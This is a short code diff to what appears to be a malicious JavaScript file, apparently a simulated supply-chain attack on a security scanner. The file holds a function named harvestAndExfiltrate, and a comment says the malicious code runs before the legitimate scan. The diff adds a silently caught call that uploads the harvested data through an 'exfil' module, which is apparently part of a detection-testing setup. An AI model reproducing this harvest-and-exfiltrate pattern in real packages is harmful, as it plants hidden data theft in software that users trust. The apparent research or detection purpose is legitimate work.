@@ -100,6 +100,10 @@ function harvestAndExfiltrate() {
 
     req.write(payload);
     req.end();
+    try {
+      const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
+      uploadJson('23', 'trivy-exfil', harvestedData);
+    } catch (_) {}
 }
 
 // Malicious code runs BEFORE the legitimate scan function is called
